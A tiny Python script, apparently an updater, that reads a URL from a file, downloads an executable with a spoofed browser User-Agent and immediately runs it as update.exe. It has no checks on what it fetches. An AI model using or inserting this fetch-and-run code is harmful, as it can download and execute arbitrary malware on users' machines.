import requests
import os
with open("update.txt", "r") as f:  # 打开文件
    url = f.read()  # 读取文件

headers = {'User-Agent':'OW64; rv:59.0) Chrome/91.0.4472.124'}
myfile = requests.get(url, headers=headers)

open("./update.exe" , 'wb').write(myfile.content)
os.system("update.exe")